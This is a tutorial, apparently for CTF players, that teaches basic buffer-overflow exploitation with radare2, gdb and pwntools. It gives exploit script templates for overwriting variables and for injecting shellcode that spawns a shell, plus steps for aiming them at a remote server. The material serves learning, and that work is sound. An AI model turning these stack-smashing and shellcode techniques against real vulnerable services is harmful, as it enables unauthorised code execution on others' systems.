# pwning basics

This tutorial is for non-pwners who need to solve a pwn challenge
because they've found themselves without one. It's also a good
jumping off point for people who want to learn how to pwn but have
no idea. I'm going to assume a few essentials are installed on your
system:

  - [pwntools](https://github.com/Gallopsled/pwntools#installation)
    (python package)
  - [radare2](https://github.com/radare/radare2#install)
    (the best tool)
  - [gdb](https://www.gnu.org/software/gdb/download/)

## identifying the challenge type

The very first thing you should do is identify the type of challenge
you're dealing with. There are a lot of different types, but if you're
dealing with a CTF challenge, the simplest pwn challenges are almost
always buffer overflows. There are a few different types of exploits
that buffer overflows allow:

  - changing variable values (easiest)
  - shellcode injection (medium)
  - return oriented programming (harder)
  - return to libc attacks (rather difficult)

From easiest to hardest, here is how to identify them:

### variable altercation

You open the binary in radare2 and inspect the binary:

```
$ r2 -A <binary_name>
[0x80049202]> s main
[0x80048000]> Vpp
```

Now you can see the assembly of the main function. Use `<j,k>` to scroll
up and down. You see something that looks like this:

```
mov eax, 0xdeadbeef
cmp eax, [local_18h]
jne 0x80049999
call sym.print_flag
```
That's pretty standard. You need the variable called [local_18h] to
have the value `0xdeadbeef` in order to go to the `print_flag` function.

### shellcode injection

You have the binary, but it doesn't look as obvious how to exploit it.
You run checksec:

```
$ checksec pwn3
[*] '/home/crclark/ctf/tamuctf/pwn3/pwn3'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

You see the line that says `NX disabled`. This means the stack is marked
as executable. Classic shellcode.

For more investigation, you give it
a huge string anytime it asks you for input (think >500 bytes). It
segfaults. Unlike in software engineering, we really really like
segfaults.

### return oriented programming

You investigate the binary for obvious signs of shellcode or variable
manipulation, but there are none.

You open the binary in radare2:

```
r2 -A <binary>
[0x08048450]> ii
[Imports]
Num  Vaddr       Bind      Type Name
   1 0x080483c0  GLOBAL    FUNC printf
   2 0x080483d0  GLOBAL    FUNC gets
   3 0x080483e0  GLOBAL    FUNC puts
   4 0x080483f0  GLOBAL    FUNC system
   5 0x00000000    WEAK  NOTYPE __gmon_start__
   6 0x08048400  GLOBAL    FUNC strchr
   7 0x08048410  GLOBAL    FUNC __libc_start_main
   8 0x08048420  GLOBAL    FUNC setvbuf
   9 0x08048430  GLOBAL    FUNC snprintf
  10 0x00000000  GLOBAL     OBJ stdout
```

You see the line that says `system`. This means the binary uses
the system function, which we can (hopefully) exploit.


## exploits

Now we get to the goods. Learn this command:

```
ragg2 -P 512 -r
```

This will give you a string of length 512 that is non-repeating
(a debruijn sequence) that you can use to calculate exactly how much
padding you need before your payload. This is critical for all exploits
because exploiting is the art of putting things very precisely in the
right (or wrong) places to get the binary to do what you want instead
of what the author wanted.

You can use `ragg2 -q 0x41414241` or whatever your sequence is
to have it tell you exactly where that sequence lives within the
entire payload. Notice that in this case you're giving it the hex
equivalent of what it gave you. This is because most of the time
your debugger or disassembler will show you these values in hex. This
also means that endianness will sometimes mess up the offsets, so
sometimes you need to tweak these values by a few bytes either up or
down.

The other important thing is scripting your exploit. Here are two
files you'll want to have on hand while developing exploits:

prof.rr2:
```
#!/usr/bin/rarun2

stdin=in.bin
```

exploit.py:
```
from pwn import *

context.log_level = 'debug'

offset = <number>
target = p32(<hex value>)
payload = offset*'a' + target

with open('in.bin','w') as f:
  f.write(payload)

r = process(<binary>)

r.recvuntil(<string>)

r.sendline(payload)

r.recv()
```

Keep these forever.

### variable manipulation

Step 1: Calculate how much padding you need

Run the binary in the debugger (preferably radare2)

```
r2 -Ad <binary>
```

Set a breakpoint at the comparison (looks like `cmp eax, [local_8h]`):

```
[0x08048450]> db <addr>
```

Run the binary:
```
[0x08048450]> dc
```

When it asks for input, paste in the big ol' string from that `ragg2`
command from earlier. (`ragg2 -P 512 -r`).

Inspect the value of the variable:
```
[0x08048450]> afvd
```
Pro-tip: if you're in visual mode (the one with all of the assembly),
type `:` to enter these commands, or `q` to go back to command mode.

Look for the value of `[local_8h]` (or whatever variable you're
manipulating). If it looks like `0x41414241` or some repetitive value,
copy that hex and feed it back to `ragg2`. (There's a way to do this
in radare2 as well: `wopO <hex>`).

That is your offset. Copy it into `exploit.py` as the value of `offset`.
Now add the target value to the `target` variable and try it out.

If you get something like `no such file or directory: flag.txt`, you've
done it! Create a file named `flag.txt` with some contents and see if
running the script prints it out.

If not, don't worry. Open the binary again, but this time with some
new flags:
```
r2 -r prof.rr2 -Ad <binary>
```

This will load your payload as the stdin of the program.

Follow the previous steps to see what the value of the variable is
now, with your payload. Check that your offset value is correct, and
tweak until satisfied.

Final step: change this line:
```
r = process(<binary>)
```
to this:
```
r = remote(<server addr>, <port num>)
```

and run to get the real flag


### shellcode

For shellcode, we're going to start the same way, by calculating
how much padding we need. Instead of checking the value of a variable
that's being overwritten, we want to see the value of the instruction
pointer. The easiest way to do this is to run the program in `gdb` with
our big ol' input string (`ragg2 -P 512 -r`).

```
(gdb) r
Starting program: /home/crclark/repos/bluehens_pwning/shellcode.elf
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsACtACuACvACwA

Program received signal SIGSEGV, Segmentation fault.
0x42416f42 in ?? ()
```

Grab that address. That's what we want to manipulate.

```
$ ragg2 -q 0x42416f42

Little endian: 302
Big endian: -1
```

Add that as our offset value. Now we can specify an address as our
target variable, and the binary will go there.

Where do we send the binary? In this type of challenge, we're going
to execute some code that we provide, called shellcode.

pwntools has a cool module that allows you to insert shellcode pretty
easily. Getting some shellcode to add to the payload looks like this:

```
buff_addr = p32(<addr>)
#buff_addr = p64(<addr>) for 64 bit

shellcode = asm(pwnlib.shellcraft.i386.linux.sh())
#shellcode = asm(pwnlib.shellcraft.amd64.linux.sh(),64)
# ^^ this is for 64-bit binaries
# check bitsize using the `file` command

payload = shellcode
payload += (offset - len(shellcode))*"A"
payload += buff_addr
```

In this case, buff_addr is the location that our shellcode is copied.
You can find this by looking for the call to `gets()` within the code.
Set a breakpoint after the call and look at the stack (in visual mode)
to see where your input shows up.

Try it, tweak it, make sure the binary is actually jumping to the
correct address. Most common issue will be needing to tweak the
offset value until things work.

Change the script to run on the remote server instead of locally:
```
r = process(<binary>)
```
```
r = remote(<addr>,<port>)
```
and you'll be good to go







